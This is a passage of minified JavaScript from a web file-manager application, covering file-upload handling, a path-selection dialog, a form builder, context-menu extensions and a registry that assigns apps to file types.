                        if (t.addClass("success"), t.find(".state").text(n), t.find(".remove").addClass("icon-ok").addClass("open").removeClass("icon-remove").removeClass("remove"), i.info) {
                            var s = "/" + ltrim(htmlEncode(i.info), "/");
                            t.find(".info .title").html(core.pathThis(s)).attr("title", s).attr("data-name", s)
                        }
                    } else n = "上传异常!", t.addClass("error").find(".state").addClass("error"), t.find(".state").text(n).attr("title", n)
                }
                uploader.removeFile(e), t.find(".progress").fadeOut(), e.fullPath || d(!1)
            }).on("uploadError", function(e, t) {
                var a = LNG.upload_error + "(" + t + ")";
                if (e.serverData) {
                    var i = 5;
                    if ((-1 !== e.serverData._raw.indexOf("[Error Code:1001]") || -1 !== e.serverData._raw.indexOf("[Error Code:1002]") || -1 !== e.serverData._raw.indexOf("[Error Code:1010]")) && (e.errorNum || (e.errorNum = 0), e.errorNum++, i >= e.errorNum)) return uploader.retry(e), void 0;
                    if (-1 !== e.serverData._raw.indexOf("<!--user login-->")) return $.each(uploader.getFiles(), function(e, t) {
                        uploader.skipFile(t), uploader.removeFile(t)
                    }), Tips.tips("login error!", !1), void 0;
                    if (e.serverData.data) {
                        var n = e.serverData.data;
                        a = LNG[n] ? LNG[n] : n
                    } else e.serverData._raw && (a = e.serverData._raw)
                }
                "http" == t && (a = LNG.upload_error_http), "abort" == t && void 0 == e.serverData && (a = LNG.not_support + "(support on chrome)"), o++, $("#" + e.id).find(".progress").fadeOut(), $("#" + e.id).addClass("error").find(".state").addClass("error"), $("#" + e.id).find(".state").html(a).attr("title", a)
            }).on("uploadFinished", function() {
                $(".dialog-file-upload .aui-title").text(LNG.upload_success + ": " + o + "/" + n), Title.reset(), n = 0, o = 0, uploader.reset(), d(!0)
            }).on("error", function(e) {
                Tips.tips(e, !1)
            });
            var p;
            inState = !1, dragOver = function() {
                if (0 == inState) {
                    if (inState = !0, !core.uploadCheck(void 0, !1)) return;
                    var e = '<div class="upload-tips">						<div>							<i class="icon-cloud cloud1 moveLeftLoop"></i>							<i class="icon-cloud cloud2"></i>							<i class="icon-cloud cloud3 moveLeftLoop"></i>						</div>						<div class="cloud-moveup"><i class="moveTopLoop icon-circle-arrow-up"></i></div>						<div class="msg">' + LNG.upload_drag_tips + "</div>					</div>";
                    MaskView.tips(e), $("#windowMaskView").css({
                        background: "#4285f4",
                        opacity: "0.8"
                    })
                }
                p && window.clearTimeout(p)
            }, dragLeave = function(e) {
                stopPP(e), p && window.clearTimeout(p), p = window.setTimeout(function() {
                    inState = !1, MaskView.close()
                }, 100)
            }, dragDrop = function(e) {
                try {
                    if (e = e.originalEvent || e, core.uploadCheck())
                        if (e.dataTransfer.files.length > 0 && e.dataTransfer.files[0].name) core.upload(), core.playSound("drag_upload");
                        else {
                            var t = e.dataTransfer.getData("text/plain");
                            t && "http" == t.substring(0, 4) && ui.path.pathOperate.appAddURL(t)
                        }
                    stopPP(e)
                } catch (e) {}
                inState && (inState = !1, MaskView.close())
            }
        }
    }
}), define("app/common/core.api", [], function() {
    var e = function(e, t, a) {
        var i = $(a.DOM.wrap),
            n = t.frames.OpenpathSelectApi,
            o = '<input type="text" class="path-select-input" readonly="true" disabled="true" />';
        "file" == e.type && (o += '<span class="label label-primary">' + e.allowExt + "</span>"), $(o).insertBefore(i.find(".aui-state-highlight"));
        var s = function(t) {
                var a = e.allowExt.split("|"),
                    i = core.pathExt(t);
                return "" == e.allowExt || "" != e.allowExt && -1 != $.inArray(i, a) ? !0 : !1
            },
            r = function() {
                var t = n.ui.fileLight.fileListSelect(),
                    a = [];
                if (e.single) {
                    var i = $(t.get(0));
                    if ("all" == e.type && 0 == t.length) a = {
                        file: [],
                        folder: []
                    };
                    else if ("file" == e.type && 0 == t.length) a = [];
                    else if ("folder" == e.type) a = [n.G.thisPath], i.hasClass("folder-box") && (a = [n.ui.fileLight.path(i)]);
                    else if ("file" == e.type) {
                        if (i.hasClass("file-box")) {
                            var o = n.ui.fileLight.path(i);
                            s(o) && (a = [o])
                        }
                    } else if ("all" == e.type)
                        if (i.hasClass("folder-box")) {
                            var o = n.ui.fileLight.path(i);
                            a = [{
                                file: [],
                                folder: [o]
                            }]
                        } else if (i.hasClass("file-box")) {
                        var o = n.ui.fileLight.path(i);
                        s(o) && (a = {
                            file: [o],
                            folder: []
                        })
                    }
                } else {
                    var r = [],
                        l = [];
                    t.each(function() {
                        if ($(this).hasClass("file-box")) {
                            var e = n.ui.fileLight.path($(this));
                            s(e) && r.push(e)
                        } else $(this).hasClass("folder-box") && l.push(n.ui.fileLight.path($(this)))
                    }), "folder" == e.type ? a = l : "file" == e.type ? a = r : "all" == e.type && (a = {
                        file: r,
                        folder: l
                    })
                }
                c(a)
            },
            l = function(e) {
                var e = trim(e, "/");
                return e == G.KOD_GROUP_ROOT_SELF || e == G.KOD_GROUP_ROOT_ALL || e == G.KOD_USER_FAV || e == G.KOD_USER_SHARE ? !1 : !0
            },
            c = function(t) {
                var a = i.find(".path-select-input"),
                    o = i.find(".aui-state-highlight");
                if ("all" != e.type) {
                    for (var s = [], r = 0; t.length > r; r++) l(t[r]) && s.push(t[r]);
                    t = s
                }
                if (0 == t.length || "all" == e.type && 0 == t.file.length && 0 == t.folder.length) o.addClass("disable"), a.attr("result", ""), a.val("");
                else {
                    var c = hashEncode(jsonEncode(t)),
                        d = "";
                    if (e.single) d = n.core.pathThis(t[0]);
                    else {
                        var p = t;
                        "all" == e.type && (p = t.folder.concat(t.file)), $.each(p, function(e, t) {
                            d += n.core.pathThis(t) + ", "
                        })
                    }
                    o.removeClass("disable"), a.attr("result", c), a.val(d)
                }
            },
            d = function() {
                n.ui.fileLight.select.hook("select", n.ui.fileLight, {
                    before: function() {},
                    after: function() {
                        r()
                    }
                })
            };
        n.kodReady || (n.kodReady = []), n.kodReady.push(function() {
            d(), r()
        })
    };
    return {
        pathSelect: function(t, a) {
            var i = {
                    type: "file",
                    title: LNG.path_api_select_file,
                    single: !0,
                    allowExt: "",
                    firstPath: !1
                },
                n = G.appHost + "/explorer&type=iframe";
            t = $.extend(i, t), t.firstPath && (n += "&path=" + t.firstPath);
            var o = ShareData.frameTop(),
                s = o.$.dialog.open(n, {
                    id: "pathSelectApi",
                    resize: !0,
                    fixed: !0,
                    top: 0,
                    ico: core.icon("folder"),
                    title: t.title,
                    lock: !0,
                    background: "#000",
                    opacity: .1,
                    width: 920,
                    height: 520,
                    ok: function() {
                        if ("function" == typeof a) {
                            var e = s.DOM.wrap,
                                i = e.find(".path-select-input").attr("result");
                            if (i = hashDecode(i), !i) return Tips.tips(LNG.error, !1), void 0;
                            i = jsonDecode(i), i ? t.single && "all" != t.type ? a(i[0]) : a(i) : Tips.tips(LNG.error, !1)
                        }
                    },
                    cancel: !0
                });
            e(t, o, s)
        },
        randomImage: function(e) {
            var t = G.settings.pluginServer + "wallpage/index&lang=" + G.lang + "&callback=?";
            $.getJSON(t, function(t) {
                "function" == typeof e && e(t)
            })
        }
    }
}), define("app/common/core.playSound", [], function() {
    var e = {
            file_remove: "file_remove.mp3",
            recycle_clear: "recycle_clear.mp3",
            folder_open: "folder_open.mp3",
            window_min: "window_min.mp3",
            error: "error_tips.mp3",
            drag_upload: "drag_upload.mp3",
            drag_drop: "drag_drop.mp3"
        },
        t = function(e) {
            var t = G.staticPath + "others/sound/" + e;
            Hook.trigger("playSound", t)
        };
    return {
        playSoundFile: t,
        playSound: function(a) {
            G && G.userConfig && "1" == G.userConfig.soundOpen && setTimeout(function() {
                t(e[a])
            }, 50)
        }
    }
}), define("app/common/core.formMake", [], function(e) {
    var t, a, i, n = {
            user: !1,
            group: !1,
            role: !1
        },
        o = function() {
            t = $("#" + a), t.find(".tab-group .tab-item").length > 1 ? s() : t.find(".tab-group").addClass("hidden"), t.find(".form-row.form-slider").exists() && r(), t.find(".form-row.form-dateTime").exists() && l(), t.find(".form-row.form-color").exists() && c(), t.find(".form-row.form-fileSelect").exists() && d(), t.find(".form-row select").exists() && p(), t.find(".form-row.form-userSelect").exists() && f(), t.find(".form-row.error [name]").die("change").live("change", function() {
                $(this).parents(".form-row.error").removeClass("error")
            }), t.find(".form-userSelect").die("click").live("click", function() {
                $(this).removeClass("error")
            })
        },
        s = function() {
            var e = t.find(".tab-content .tab-pane"),
                a = t.find(".tab-group .tab-item");
            e.each(function() {
                var i = $(this).attr("id"),
                    n = t.find("." + i);
                n.length > 0 ? n.appendTo($(this)) : (e.filter("#" + i).remove(), a.find('[data-id="' + i + '"]').parent().remove())
            }), a.click(function() {
                a.removeClass("active"), $(this).addClass("active");
                var t = $(this).find("a").attr("data-id");
                e.removeClass("active"), e.filter("#" + t).addClass("active")
            })
        },
        r = function() {
            seajs.use("lib/bootstrap-slider/bootstrap-slider.css"), seajs.use("lib/colorpicker/css/colorpicker.css"), e.async("lib/bootstrap-slider/bootstrap-slider.js", function() {
                t.find(".form-slider input").slider()
            })
        },
        l = function() {
            e.async(["lib/jquery.datetimepicker/jquery.datetimepicker.css", "lib/jquery.datetimepicker/jquery.datetimepicker.js"], function() {
                var e = "zh-CN" == G.lang || "zh-TW" == G.lang ? "ch" : "en";
                t.find(".form-dateTime input").each(function() {
                    var t = $(this).attr("data-format"),
                        a = ["Y", "y", "L", "F", "M", "t", "n", "m", "d", "D", "j", "l", "N", "S", "W", "z", "w"],
                        i = ["H", "h", "i", "s", "A", "a", "b", "g", "G", "O", "P", "c", "U"],
                        n = !1,
                        o = !1;
                    t || (t = "Y/m/d");
                    for (var s = 0; a.length > s; s++)
                        if (-1 !== t.indexOf(a[s])) {
                            n = !0;
                            break
                        }
                    for (var s = 0; i.length > s; s++)
                        if (-1 !== t.indexOf(i[s])) {
                            o = !0;
                            break
                        }
                    $(this).datetimepicker({
                        format: t,
                        datepicker: n,
                        timepicker: o,
                        lang: e
                    }).blur(function() {
                        $(this).trigger("change")
                    })
                })
            }), t.find(".form-dateTime .input-btn-right").unbind("click").click(function() {
                $(this).parent().find("input").focus()
            })
        },
        c = function() {
            e.async("lib/colorpicker/js/colorpicker", function() {
                t.find(".form-color input").ColorPicker({
                    onBeforeShow: function(e) {
                        $(e).attr("input-name", $(this).attr("name")), $(this).ColorPickerSetColor(this.value)
                    },
                    onShow: function(e) {
                        return $(e).fadeIn(100), !1
                    },
                    onHide: function(e) {
                        return $(e).fadeOut(100), !1
                    },
                    onChange: function(e, t) {
                        var a = $($(this).data("colorpicker").el);
                        a.val("#" + t).trigger("change"), a.parent().find(".btn i").css("background", a.val())
                    }
                }).bind("keyup", function() {
                    $(this).ColorPickerSetColor(this.value), $(this).parent().find(".btn i").css("background", $(this).val())
                }), t.find(".form-color .input-btn-right").unbind("click").click(function() {
                    $(this).parent().find("input").click()
                })
            })
        },
        d = function() {
            t.find(".path-select").die("click").live("click", function() {
                var e = $(this);
                core.api.pathSelect({
                    type: "file",
                    title: LNG.path_api_select_image,
                    allowExt: "png|jpg|bmp|gif|jpeg|ico|svg|tiff"
                }, function(t) {
                    var t = core.path2url(t);
                    e.parent().find("input[type=text]").val(t).trigger("change")
                })
            })
        },
        p = function() {
            seajs.use("lib/select2/css/select2.min.css"), e.async("lib/select2/js/select2.full.min.js", function() {
                var a = function(t, a) {
                    t.on("select2:select", function(e) {
                        if (!t.attr("multiple")) return t.select2("close"), void 0;
                        var a = $(e.params.data.element);
                        a.detach(), t.append(a), t.trigger("change.select2")
                    }).on("select2:unselect", function(e) {
                        stopPP(e.params.originalEvent)
                    }).on("change", function() {
                        setTimeout(function() {
                            $(window).trigger("resize")
                        }, 10)
                    }), "group" == a && t.on("select2:open", function() {
                        e.async("lib/ztree/ztree", function() {
                            h(t, n[a])
                        })
                    });
                    var i = t.attr("data-value");
                    i && (t.attr("multiple") && (i = i.split(",")), t.val(i).trigger("change"))
                };
                t.find("select").each(function() {
                    var e = $(this),
                        t = e.attr("data-server"),
                        i = !1;
                    "tags" == e.parents(".form-row").attr("data-type") && (i = !0), t ? u(t, function(n) {
                        e.select2({
                            data: n,
                            tags: i,
                            tokenSeparators: [",", " "],
                            closeOnSelect: !1
                        }), a(e, t)
                    }) : (e.select2({
                        closeOnSelect: !1,
                        tags: i,
                        tokenSeparators: [",", " "]
                    }), a(e, t))
                })
            })
        },
        f = function() {
            var e = t.find(".form-userSelect .btn-group"),
                a = "btn-active",
                i = "hidden";
            e.find("button").unbind("click").bind("click", function() {
                var e = $(this).attr("data-type"),
                    t = $(this).parents(".btn-group"),
                    n = t.parent().find(".user-select"),
                    o = t.parent().find(".user-select-" + e);
                n.filter(":visible"), t.attr("multiple") ? "all" == e ? (t.find("button").removeClass(a), $(this).addClass(a), n.addClass(i), o.removeClass(i)) : ($(this).toggleClass(a), o.toggleClass(i), $(this).hasClass(a) ? t.find("[data-type=all]").removeClass(a) : t.find("." + a).exists() || t.find("[data-type=all]").addClass(a)) : (t.find("button").removeClass(a), $(this).addClass(a), n.addClass(i), o.removeClass(i))
            })
        },
        u = function(e, t) {
            var a = function(e) {
                var t = [];
                for (var a in e) t.push({
                    id: a,
                    text: e[a].name
                });
                return t
            };
            if (n[e] && t) return t(a(n[e])), void 0;
            var i = {
                user: G.appHost + "systemMember/get",
                group: G.appHost + "systemGroup/get",
                role: G.appHost + "systemRole/get"
            };
            return null == n[e] ? (Hook.bind("loadDataServer-" + e, function() {
                t(a(n[e]))
            }), void 0) : (n[e] = null, $.ajax({
                url: i[e],
                dataType: "json",
                error: function() {
                    n[e] = !1, Tips.tips(LNG.system_error, 0)
                },
                success: function(i) {
                    return i.code ? (n[e] = i.data, t && t(a(n[e])), Hook.trigger("loadDataServer-" + e), void 0) : (Tips.tips(i), void 0)
                }
            }), void 0)
        },
        h = function(e, t) {
            var a = function(e) {
                    var t = function(e) {
                            for (var a = 0; e.length > a; a++) void 0 != e[a] ? (e[a].pid = e[a].parentID, e[a].id = e[a].groupID, delete e[a].children, delete e[a].parentID, delete e[a].groupID, e[a].child && (e[a].children = e[a].child, delete e[a].child, t(e[a].children))) : delete e[a]
                        },
                        a = [],
                        i = $.extend(!0, {}, e);
                    for (var n in i) {
                        var o = i[n],
                            s = o.parentID;
                        if (i[s]) i[s].child || (i[s].child = []), i[s].child.push(i[o.groupID]);
                        else {
                            var r = i[o.groupID];
                            r && a.push(r)
                        }
                    }
                    return t(a), a
                },
                i = {
                    view: {
                        showLine: !1,
                        selectedMulti: !1,
                        dblClickExpand: !1,
                        addDiyDom: function(e, t) {
                            var a = 12,
                                i = $("#" + e + " #" + t.tId + "_switch"),
                                n = $("#" + e + " #" + t.tId + "_ico");
                            if (n.before(i).after('<i class="font-icon check-icon"></>').before('<span class="tree_icon button">' + core.iconSmall("group-guest") + "</span>").removeClass("ico_docu").addClass("group_icon").remove(), t.level >= 1) {
                                var o = "<span class='space' style='display:inline-block;width:" + a * t.level + "px'></span>";
                                i.before(o)
                            }
                            $("#" + e + " #" + t.tId + "_a").attr("data-group-id", t.id)
                        }
                    },
                    callback: {
                        onClick: function(e, t, a) {
                            n(t, a)
                        }
                    }
                },
                n = function(t, a) {
                    var i = $("#" + a.tId + "_a");
                    if (i.removeClass("curSelectedNode"), e.attr("multiple")) {
                        i.toggleClass("this");
                        var n = e.val();
                        $.isArray(n) || (n = []), i.hasClass("this") ? n.push(a.id) : n = _.without(n, a.id), $.each(n, function() {
                            var t = e.find("[value=" + this + "]");
                            t.detach(), e.append(t)
                        }), e.val(n).trigger("change")
                    } else $("#" + t + " [treenode_a].this").removeClass("this"), i.toggleClass("this"), e.val(a.id).trigger("change"), e.select2("close")
                },
                o = function() {
                    var t = e.val(),
                        a = $(".select2-container--open .group-list-tree").attr("id"),
                        i = $.fn.zTree.getZTreeObj(a);
                    $("#" + a + " [treenode_a]").removeClass("this"), "string" == typeof t && (t = [t]), t && i.getNodesByFilter(function(e) {
                        inArray(t, e.id + "") && $("#" + e.tId + "_a").addClass("this")
                    })
                },
                s = function(e) {
                    var t = $(".select2-container--open .group-list-content");
                    t.find(".select2-results__options,.group-list-tree").removeClass("hidden"), "search" == e ? t.find(".group-list-tree").addClass("hidden") : t.find(".select2-results__options").addClass("hidden")
                },
                r = function(t) {
                    var n = function(e) {
                        e.unbind("change input").bind("change input", function() {
                            $(this).val().length > 0 ? s("search") : s("tree")
                        })
                    };
                    if (e.attr("multiple") ? n(e.parent().find(".select2-search__field")) : n($(".select2-container--open .select2-search__field")), $(".select2-container--open .group-list-tree").exists()) return o(), s("tree"), void 0;
                    e.on("open", function() {
                        o()
                    }).on("select2:unselect", function() {
                        o()
                    });
                    var r = UUID(),
                        l = '<div class="ztree group-list-tree" id="' + r + '" style="height:250px;overflow: auto;"></div>';
                    $(l).appendTo(".select2-container--open .select2-results"), $(".select2-container--open .select2-results__options").addClass("hidden").parent().addClass("group-list-content");
                    var c = a(t);
                    $.fn.zTree.init($("#" + r), i, c);
                    var d = $.fn.zTree.getZTreeObj(r);
                    d && d.expandAll(!0), o(), s("tree")
                };
            r(t)
        },
        m = function() {
            var e = {},
                a = [],
                n = function(e) {
                    for (var t = {
                            all: "0",
                            user: "",
                            group: "",
                            role: ""
                        }, a = e.split(";"), i = 0; a.length > i; i++) {
                        var n = a[i].split(":");
                        2 == n.length && (t[n[0]] = n[1])
                    }
                    return "0" != t.all || t.user || t.group || t.role ? !0 : !1
                };
            if (t.find(".form-row").each(function() {
                    var t = $(this),
                        o = $(this).attr("data-type"),
                        s = $(this).find("[name]");
                    $(this).find(".setting-title .require").exists();
                    var r = s.attr("name"),
                        l = !1;
                    switch (o) {
                        case "input":
                        case "textarea":
                        case "password":
                        case "number":
                        case "slider":
                        case "color":
                        case "dateTime":
                        case "fileSelect":
                            l = s.val();
                            break;
                        case "switch":
                            l = s.prop("checked") + 0 + "";
                            break;
                        case "radio":
                            l = s.filter(":checked").attr("value");
                            break;
                        case "checkbox":
                            l = [], s.filter(":checked").each(function() {
                                l.push($(this).val())
                            }), l = l.join(",");
                            break;
                        case "select":
                        case "selectMutil":
                        case "tags":
                        case "group":
                        case "role":
                        case "user":
                            l = s.val(), $.isArray(l) && (l = l.join(",")), null == l && (l = "");
                            break;
                        case "userSelect":
                            var c = {
                                all: "0",
                                user: "",
                                group: "",
                                role: ""
                            };
                            t.find(".btn-group .btn-active").each(function() {
                                var e = $(this).attr("data-type"),
                                    a = "1";
                                "all" != e && (a = $(t).find(".user-select-" + e + " select").val(), $.isArray(a) && (a = a.join(",")), null == a && (a = "")), c[e] = a
                            }), l = "all:" + c.all + ";user:" + c.user + ";group:" + c.group + ";role:" + c.role;
                            break;
                        default:
                    }
                    $(this).removeClass("error"), i[r] && i[r].require && (l === !1 || null === l || "string" == typeof l && "" === l || "userSelect" == i[r].type && !n(l)) ? ($(this).addClass("error"), a.push({
                        name: r,
                        value: l
                    })) : e[r] = l
                }), a.length > 0) {
                Tips.tips(LNG.PluginConfigNotNull, "warning");
                var o = t.find(".panel-body"),
                    s = t.find(".form-row.error");
                if (!s.parents(".tab-pane").hasClass("active")) {
                    var r = s.parents(".tab-pane").attr("id");
                    t.find('.tab-group [data-id="' + r + '"]').click()
                }
                s.inScreen() || o.animate({
                    scrollTop: s.offset().top - o.offset().top + o.scrollTop()
                }, 100), s.find("[name]").first().focus(), s.find(".setting-content").flash(3, 100)
            }
            return {
                checked: 0 == a.length,
                error: a,
                result: e
            }
        },
        v = function(t) {
            e.async(t, function(e) {
                e && ($.isFunction(e) ? e() : "object" == typeof e && e.hasOwnProperty("main") && $.isFunction(e.main) && e.main())
            })
        },
        g = function(e) {
            if ("string" == typeof e) return v(file), !1;
            if ($.isPlainObject(e.formStyle) && e.formStyle.loadFile) {
                var t = e.formStyle.loadFile;
                "string" == typeof t && (t = [t]), $.isArray(t) && $(t).each(function(e, t) {
                    v(t)
                })
            }
            i = e, a = UUID();
            var n = template.compile(tplFormMake),
                o = n({
                    LNG: LNG,
                    items: e,
                    wrapID: a
                });
            return o
        },
        b = function(e, t, a) {
            var i = g(e);
            if (!i) return !1;
            var n = {
                padding: 0,
                fixed: !0,
                resize: !0,
                title: LNG.search,
                ico: core.icon("config"),
                width: 680,
                height: 500,
                content: i,
                okVal: LNG.button_save,
                ok: function() {
                    var e = m();
                    return e.checked ? a(e.result) : !1
                }
            };
            if ($.isPlainObject(t))
                for (var s in t) n[s] = t[s];
            var r = $.dialog(n),
                l = r.DOM.wrap.find(".aui-title").html();
            return r.DOM.wrap.find(".modal-title").html(l), o(), r
        };
    return {
        makeHtml: g,
        bindEvent: o,
        getFormData: m,
        initDialog: b
    }
}), define("app/common/rightMenuExtence", [], function() {
    $.contextMenu || ($.contextMenu = {}), $.contextMenu.show = function(e, t, a) {
        e && ($.contextMenu.hidden(), $(e).contextMenu({
            x: t,
            y: a
        }))
    }, $.contextMenu.menuShow = function() {
        var e = $(".context-menu-active"),
            t = e.data("contextMenu");
        if (e && t) {
            var a = t.$menu,
                i = "disable";
            a.find(".disable").addClass(i), Hook.trigger("rightMenu.show", t.selector, e, a), Hook.trigger("rightMenu.show" + t.selector, e, a)
        }
    }, $.contextMenu.isDisplay = function() {
        return 0 == $(".context-menu-list:visible").length ? !1 : !0
    }, $.contextMenu.hidden = function() {
        $(".context-menu-list").filter(":visible").filter(":not(.menu-not-auto-hidden)").trigger("contextmenu:hide")
    }, $.contextMenu.menuAdd = function(e, t, a, i) {
        var n = !1,
            o = $.contextMenu.menus;
        for (var s in o)
            if (o[s].selector == t) {
                n = o[s];
                break
            }
        if (n && e) {
            var r = function(e) {
                    return e ? -1 !== e.indexOf("/") ? '<i class="font-icon"><img draggable="false" class="x-item-file" ondragstart="return false;" src="' + e + '"></i>' : '<i class="font-icon ' + e + '"></i>' : ""
                },
                l = function(e, t, a, i) {
                    var o = [],
                        s = {};
                    if (a) {
                        for (var c in t) o.push({
                            key: c,
                            value: t[c]
                        });
                        for (var d = o.length - 1; d >= 0; d--) s[o[d].key] = o[d].value
                    } else s = t;
                    $.each(s, function(t, o) {
                        o.className = o.className || "";
                        var s = t + " " + o.className;
                        if ("string" == typeof o) var c = '<li class="context-menu-item ' + s + ' context-menu-separator not-selectable"></li>';
                        else {
                            var d = o.name;
                            o.accesskey && (d += '(<span class="context-menu-accesskey">' + o.accesskey + "</span>)");
                            var c = '<li class="context-menu-item ' + s + '">' + r(o.icon) + "<span>" + d + "</span></li>"
                        }
                        var p = $(c).clone();
                        a ? e.$menu.find(a).first().after(p) : i && e.$menu.find(i).first().before(p);
                        var f = p.parent(".context-menu-list").data("contextMenu");
                        p.data({
                            contextMenu: f,
                            contextMenuKey: t,
                            contextMenuRoot: n
                        });
                        var u = {
                            $input: null,
                            $label: null,
                            accesskey: o.accesskey,
                            className: o.className,
                            icon: o.icon,
                            name: o.name,
                            _name: d,
                            $node: p
                        };
                        if (f && (f.items || (f.items = {}), f.items[t] = u), "string" != typeof o && (e.commands || (e.commands = {}), e.commands[t] = u, n.commands[t] = u, n.callbacks[t] = function(e, t) {
                                o.callback(e, t)
                            }, o.accesskey && (n.accesskeys[o.accesskey] = u), o.items)) {
                            var c = '<ul class="context-menu-list ' + t + '">						<li class="context-menu-item hidden ' + t + '-first"><span></span></li>					</ul>';
                            $(c).appendTo(p), u.$menu = p.find("ul." + t), u.callback = null, u.appendTo = u.$node, u.type = "sub", p.data("contextMenu", u).addClass("context-menu-submenu"), p.find("ul." + t).data({
                                contextMenuRoot: n,
                                contextMenu: u
                            }), p.find("li." + t + "-first").data({
                                contextMenuRoot: n,
                                contextMenuKey: t + "-first",
                                contextMenu: u
                            }), u.items || (u.items = {}), u.items[t + "-first"] = {
                                $input: null,
                                $label: null,
                                icon: "",
                                name: "",
                                _name: "",
                                $node: p.find("li." + t + "-first")
                            }, l(u, o.items, "." + t + "-first")
                        }
                    })
                };
            l(n, e, a, i)
        }
    };
    var e = function() {
        return $('<i class="dialog-menu"></i>').appendTo("#rightMenu"), "function" != typeof $.contextMenu ? console.info("$.contextMenu is not function!") : ($.contextMenu({
            zIndex: 9999,
            selector: ".dialog-menu",
            items: {
                "dialog-quit": {
                    name: LNG.close,
                    className: "dialog-quit",
                    icon: "remove",
                    accesskey: "q"
                },
                "dialog-max": {
                    name: LNG.dialog_max,
                    className: "dialog-max",
                    icon: "resize-full",
                    accesskey: "a"
                },
                "dialog-min": {
                    name: LNG.dialog_min,
                    className: "dialog-min",
                    icon: "minus",
                    accesskey: "i"
                },
                sep1: "--------",
                refresh: {
                    name: LNG.refresh,
                    className: "refresh",
                    icon: "refresh",
                    accesskey: "r"
                },
                "open-window": {
                    name: LNG.open_ie,
                    className: "open-window",
                    icon: "globe",
                    accesskey: "b"
                },
                qrcode: {
                    name: LNG.qrcode,
                    className: "qrcode",
                    icon: "qrcode",
                    accesskey: "c"
                }
            },
            callback: function(e, t) {
                var a = t.$trigger.attr("id"),
                    i = $.dialog.list[a];
                switch (e) {
                    case "dialog-quit":
                        i.close();
                        break;
                    case "dialog-min":
                        i._clickMin(!1);
                        break;
                    case "dialog-max":
                        i._clickMax();
                        break;
                    case "refresh":
                        i.refresh();
                        break;
                    case "open-window":
                        i.openWindow();
                        break;
                    case "qrcode":
                        core.qrcode(i.DOM.wrap.find("iframe").attr("src"));
                        break;
                    default:
                }
            }
        }), $(".aui-title img,.aui-title .x-item-file").die("click").live("click", function(e) {
            var t = $(this).offset();
            t.top += $(this).outerHeight(), $(this).parent().parent().contextMenu({
                x: e.pageX,
                y: t.top
            })
        }).die("dblclick").live("dblclick", function() {
            var e = $(this).parent().parent().attr("id"),
                t = $.dialog.list[e];
            t.close(), $.contextMenu.hidden()
        }), void 0)
    };
    Hook.bind("rightMenu.show.dialog-menu", function(e, t) {
        var a = e.attr("id"),
            i = $.dialog.list[a],
            n = "hidden",
            o = ".open-window,.refresh,.qrcode,.context-menu-separator";
        i.hasFrame() ? t.find(o).removeClass(n) : t.find(o).addClass(n);
        var s = ".dialog-min,.dialog-max";
        $("." + a).hasClass("dialog-can-resize") ? t.find(s).removeClass(n) : t.find(s).addClass(n)
    }), e()
}), define("app/app/appBase", [], function() {
    var e = {},
        t = {},
        a = {},
        i = !1,
        n = function(a) {
            a.title = void 0 == a.title ? a.name : a.title, void 0 == a.name && (a.name = UUID(), a.hidden = !0), e[a.name] = a, a.ext || (a.ext = "");
            var i = a.ext.split(",");
            e[a.name].extArr = i, a.sort = a.sort !== void 0 ? parseInt(a.sort) : 0;
            for (var n = 0; i.length > n; n++) {
                var o = trim(i[n]);
                e[a.name].extArr[n] = o, t[o] || (t[o] = []);
                for (var s = !1, r = 0; t[o].length > r; r++)
                    if (t[o][r].name == a.name) {
                        s = !0;
                        break
                    }
                s || (t[o].push({
                    name: a.name,
                    sort: a.sort
                }), t[o].length > 1 && (t[o] = _.sortBy(t[o], "sort").reverse()))
            }
            Hook.trigger("kodApp.add.finished")
        },
        o = function() {
            return t
        },
        s = function(i) {
            if (!i || !e[i]) return !1;
            delete e[i];
            for (var n in a)
                if (a[n] == i) {
                    delete a[n];
                    break
                }
            for (var n in t) {
                for (var o = t[n], s = [], r = 0; o.length > r; r++) o[r].name != i && s.push(o[r]);
                0 == s.length ? delete t[n] : t[n] = s
            }
        },
        r = function(i) {
            if (i === void 0) {
                var n = [];
                for (var o in e) e[o].hidden || n.push(e[o]);
                return n
            }
            var s = a[i],
                n = [];
            if (!s && !t[i]) return !1;
            if (s && (e[s] ? n.push(e[s]) : delete a[i]), !t[i]) return n;
            for (var r = 0; t[i].length > r; r++) {
                var l = t[i][r].name;
                e[l] && l != s && n.push(e[l])
            }
            return n
        },
        l = function(e) {
            i = e
        },
        c = function() {
            return i
        },
        d = function(t, a, i) {
            a && "file" != a || (a = core.pathExt(t)), i = i ? i : "";
            var n = {
                path: t,
                ext: a,
                appName: i
            };
            if (!Hook.trigger("kodApp.open.before", n)) {
                if (t = n.path, a = n.ext, i = n.appName) var o = e[i];
                else {
                    var s = r(a);
                    if (!s || 0 == s.length) return kodApp.openUnknow(t, ""), void 0;
                    var o = s[0]
                }
                if (!o) return Tips.tips("[" + i + "] not exists", !1);
                try {
                    o.callback(t, a), Hook.trigger("kodApp.open.after", t, a, o)
                } catch (l) {
                    kodApp.openUnknow(t, ""), console.error("kodApp.open error:", l)
                }
            }
        },
        p = function(t) {
            var a = r(t),
                i = r("");
            "" == t && (a = !1), a ? a.push({
                name: ""
            }) : a = [], a = a.concat(i);
            for (var n = {}, o = 0; a.length > o; o++) {
                var s = a[o];
                "" == s.name || s.hidden ? n["step-line"] = "-------" : n[s.name] = {
                    app: s.name,
                    name: s.title,
                    className: s.className,
                    icon: s.icon,
                    callback: function(t) {
                        var a = e[t];
                        if (a && a.callback) {
                            if ($(".context-menu-active"), $(".context-menu-active").hasClass("menu-tree-file")) var i = ui.tree.makeParam();
                            else var i = ui.path.makeParam();
                            a.callback(i.path, i.type)
                        }
                    }
                }
            }
            return n
        },
        f = function(e, t) {
            u(e, t), G.userConfig.kodAppDefault = htmlEncode(jsonEncode(a)), G.shareInfo || $.get(G.appHost + "setting/set&k=kodAppDefault&v=" + jsonEncode(a))
        },
        u = function(t, i) {
            if ("string" == typeof t) a[t] = i;
            else if ($.isArray(t))
                for (var n = 0; t.length > n; n++) a[t[n]] = i;
            else if (e[i] && $.isArray(e[i].extArr))
                for (var o = e[i].extArr, n = 0; o.length > n; n++) a[o[n]] = i
        },
        h = function() {
            G.userConfig.kodAppDefault = "[]", a = {}
        },
        m = function(t, a) {
            var t = e[t];
            return t ? a ? inArray(t.extArr, a) : t.ext : !1
        },
        v = function(a, i, n) {
            var a = e[a];
            if (!a) return !1;
            var o = "undefined" == n ? 0 : parseInt(n);
            0 == o && a.sort !== void 0 && (o = parseInt(a.sort)), "string" == $.type(i) && (i = i.split(","));
            for (var s = 0; i.length > s; s++) {
                var r = i[s];
                if (r) {
